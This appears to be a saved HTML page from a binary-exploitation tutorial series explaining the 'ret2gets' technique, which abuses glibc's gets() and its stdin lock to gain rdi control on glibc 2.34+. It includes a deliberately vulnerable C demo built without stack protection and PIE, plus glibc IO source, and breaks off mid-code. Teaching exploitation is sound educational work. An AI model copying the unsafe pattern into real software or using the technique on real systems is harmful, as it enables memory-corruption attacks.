<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-pwn/rop-2.34+/ret2gets" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.8.1">
<title data-rh="true">ret2gets | My Site</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://0xa5h.com/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://0xa5h.com/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://0xa5h.com/pwn/pwn/rop-2.34+/ret2gets"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="ret2gets | My Site"><meta data-rh="true" name="description" content="Who needs &quot;pop rdi&quot; when you have gets()"><meta data-rh="true" property="og:description" content="Who needs &quot;pop rdi&quot; when you have gets()"><link data-rh="true" rel="icon" href="/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://0xa5h.com/pwn/pwn/rop-2.34+/ret2gets"><link data-rh="true" rel="alternate" href="https://0xa5h.com/pwn/pwn/rop-2.34+/ret2gets" hreflang="en"><link data-rh="true" rel="alternate" href="https://0xa5h.com/pwn/pwn/rop-2.34+/ret2gets" hreflang="x-default"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"pwn","item":"https://0xa5h.com/pwn/category/pwn"},{"@type":"ListItem","position":2,"name":"ROP 2.34+","item":"https://0xa5h.com/pwn/category/rop-234"},{"@type":"ListItem","position":3,"name":"ret2gets","item":"https://0xa5h.com/pwn/pwn/rop-2.34+/ret2gets"}]}</script><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="My Site RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="My Site Atom Feed"><link rel="stylesheet" href="/assets/css/styles.737db2af.css">
<script src="/assets/js/runtime~main.f72019f0.js" defer="defer"></script>
<script src="/assets/js/main.aa702dda.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<svg xmlns="http://www.w3.org/2000/svg" style="display: none;"><defs>
<symbol id="theme-svg-external-link" viewBox="0 0 24 24"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
</defs></svg>
<script>!function(){var t="light";var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();document.documentElement.setAttribute("data-theme",e||t),document.documentElement.setAttribute("data-theme-choice",e||t)}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/img/logo.svg"><link rel="preload" as="image" href="/assets/image (119).png"><link rel="preload" as="image" href="/assets/image (121).png"><link rel="preload" as="image" href="/assets/image (123).png"><link rel="preload" as="image" href="/assets/image (124).png"><link rel="preload" as="image" href="/assets/image (125).png"><link rel="preload" as="image" href="/assets/image (127).png"><link rel="preload" as="image" href="/assets/image (118).png"><link rel="preload" as="image" href="/assets/image (117).png"><link rel="preload" as="image" href="/assets/image (31).png"><link rel="preload" as="image" href="/assets/image (30).png"><link rel="preload" as="image" href="/assets/image (32).png"><link rel="preload" as="image" href="/assets/image (34).png"><link rel="preload" as="image" href="/assets/image (35).png"><link rel="preload" as="image" href="/assets/image (36).png"><link rel="preload" as="image" href="/assets/image (37).png"><div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="theme-layout-navbar navbar navbar--fixed-top"><div class="navbar__inner"><div class="theme-layout-navbar-left navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/logo.svg" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/img/logo.svg" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">My Site</b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/pwn/">Tutorial</a><a class="navbar__item navbar__link" href="/blog">Blog</a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><a href="https://github.com/facebook/docusaurus" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="system mode" aria-label="Switch between dark and light mode (currently system mode)"><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP systemToggleIcon_QzmC"><path fill="currentColor" d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/pwn/">Introduction</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" href="/pwn/category/pwn">pwn</a><button aria-label="Collapse sidebar category &#x27;pwn&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" tabindex="0" href="/pwn/category/rop-234">ROP 2.34+</a><button aria-label="Collapse sidebar category &#x27;ROP 2.34+&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/pwn/pwn/rop-2.34+/the-problem">The problem</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/pwn/pwn/rop-2.34+/ret2gets">ret2gets</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/pwn/pwn/rop-2.34+/controlling-rbp">Controlling rbp</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/pwn/pwn/rop-2.34+/controlling-rax">Controlling rax</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/pwn/pwn/rop-2.34+/dlrop">dlrop</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/pwn/pwn/rop-2.34+/other-gadgets">Other gadgets</a></li></ul></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/pwn/pwn/setcontext">setcontext</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/pwn/pwn/fork_gadget">fork\_gadget</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/pwn/category/ctf-writeups">CTF writeups</a><button aria-label="Expand sidebar category &#x27;CTF writeups&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/pwn/category/test">Test</a><button aria-label="Expand sidebar category &#x27;Test&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/pwn/category/pwn"><span>pwn</span></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/pwn/category/rop-234"><span>ROP 2.34+</span></a></li><li class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link">ret2gets</span></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>ret2gets</h1></header>
<p>Ah the <code>gets</code> function, a staple of insecure coding and overflow challenges, reading as much data as possible upto a <code>\n</code>. While most people are interested in its unlimited overflow, I&#x27;m interested in its applications for <code>rdi</code> control, and even libc leaks. What am I talking about you may be asking?</p>
<p>Well, let&#x27;s go back to the demo program.</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">// gcc demo.c -o demo -no-pie -fno-stack-protector</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">include</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property string" style="color:#e3116c">&lt;stdio.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> buf</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">0x20</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token function" style="color:#d73a49">puts</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;ROP me if you can!&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token function" style="color:#d73a49">gets</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">buf</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre></div></div>
<p>Running this under <code>gdb</code>, let&#x27;s enter any string, and see what happens to the registers after <code>gets</code>, because as you probably know, many functions will clobber the argument variables as they have no need to preserve them, and will use them either as scratch registers, or in other function calls (or both!). For <code>gets</code>, all we&#x27;d need is some writable address to land in <code>rdi</code>, then perhaps we could do something?</p>
<figure><img src="/assets/image (119).png" alt=""><figcaption><p>gdb after entering &quot;aaaa&quot;</p></figcaption></figure>
<figure><img src="/assets/image (121).png" alt=""><figcaption><p><code>_IO_stdfile_0_lock</code> in memory</p></figcaption></figure>
<p>Bingo! We have a address which appears to exist in libc&#x27;s <strong>writable</strong> region, so by calling <code>gets</code> again in our rop chain, we could overwrite libc data, perhaps smash some useful structures. However, without a libc leak that could be limited. There could be multiple ways to utilise this, but the one I&#x27;m most interested in here is smashing <code>_IO_stdfile_0_lock</code>.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="_io_stdfile_0_lock"><code>_IO_stdfile_0_lock</code><a href="#_io_stdfile_0_lock" class="hash-link" aria-label="Direct link to _io_stdfile_0_lock" title="Direct link to _io_stdfile_0_lock">​</a></h2>
<p>Let&#x27;s not beat around the bush, glibc&#x27;s IO is complicated, so much so that there&#x27;s a whole category related to IO exploitation, called <code>FSOP</code>. That won&#x27;t be the focus here, instead we&#x27;re looking at what&#x27;s generally overlooked when it comes to glibc IO: <strong>locking</strong>.</p>
<p>Because glibc supports multithreading, many glibc functions need to be thread-safe, which means that they&#x27;re resistant to data racing. This is a problem faced by glibc IO, because multiple threads can use the same <code>FILE</code> structures at the same time, so if 2 threads try to use one at the same time, this is called a race condition, and it can break the <code>FILE</code>. We fix this using locks.</p>
<p>If you&#x27;ve ever looked at glibc source code for IO functions (as you do), you may noticed a common pattern with a lot of them (except printf and scanf, as they&#x27;re more complicated, more on those later). Let&#x27;s take <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/iogets.c#L31" target="_blank" rel="noopener noreferrer">gets</a> (2.35 for now):</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">_IO_gets</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">buf</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token class-name">size_t</span><span class="token plain"> count</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> ch</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">retval</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token function" style="color:#d73a49">_IO_acquire_lock</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token constant" style="color:#36acaa">stdin</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  ch </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">_IO_getc_unlocked</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token constant" style="color:#36acaa">stdin</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ch </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token constant" style="color:#36acaa">EOF</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      retval </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token constant" style="color:#36acaa">NULL</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token keyword" style="color:#00009f">goto</span><span class="token plain"> unlock_return</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ch </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token char">&#x27;\n&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    count </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">else</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token comment" style="color:#999988;font-style:italic">/* This is very tricky since a file descriptor may be in the</span><br></span><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">	 non-blocking mode. The error flag doesn&#x27;t mean much in this</span><br></span><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">	 case. We return an error only when there is a new error. */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> old_error </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token constant" style="color:#36acaa">stdin</span><span class="token operator" style="color:#393A34">-&gt;</span><span class="token plain">_flags </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain"> _IO_ERR_SEEN</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token constant" style="color:#36acaa">stdin</span><span class="token operator" style="color:#393A34">-&gt;</span><span class="token plain">_flags </span><span class="token operator" style="color:#393A34">&amp;=</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">~</span><span class="token plain">_IO_ERR_SEEN</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      buf</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">char</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> ch</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      count </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">_IO_getline</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token constant" style="color:#36acaa">stdin</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> buf </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> INT_MAX</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token char">&#x27;\n&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token constant" style="color:#36acaa">stdin</span><span class="token operator" style="color:#393A34">-&gt;</span><span class="token plain">_flags </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain"> _IO_ERR_SEEN</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	  retval </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token constant" style="color:#36acaa">NULL</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	  </span><span class="token keyword" style="color:#00009f">goto</span><span class="token plain"> unlock_return</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token keyword" style="color:#00009f">else</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token constant" style="color:#36acaa">stdin</span><span class="token operator" style="color:#393A34">-&gt;</span><span class="token plain">_flags </span><span class="token operator" style="color:#393A34">|=</span><span class="token plain"> old_error</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  buf</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">count</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  retval </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> buf</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">unlock_return</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token function" style="color:#d73a49">_IO_release_lock</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token constant" style="color:#36acaa">stdin</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> retval</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre></div></div>
<p>At the start of the function it uses <code>_IO_acquire_lock</code>, and at the end it uses <code>_IO_release_lock</code>. The idea is that <em>acquiring</em> the lock tells other threads that <code>stdin</code> is currently in use, and any other threads that try to access <code>stdin</code> will be forced to wait until this thread <em>releases</em> the lock, telling other threads that <code>stdin</code> is no longer in use.</p>
<p>For this reason, <code>FILE</code> has a field <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/bits/types/struct_FILE.h#L81" target="_blank" rel="noopener noreferrer">_lock</a>, which is a pointer to a <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/nptl/stdio-lock.h#L26" target="_blank" rel="noopener noreferrer">_IO_lock_t</a> (stored at offset <code>+0x88</code>):</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">typedef</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">struct</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> lock</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> cnt</span><span class="token 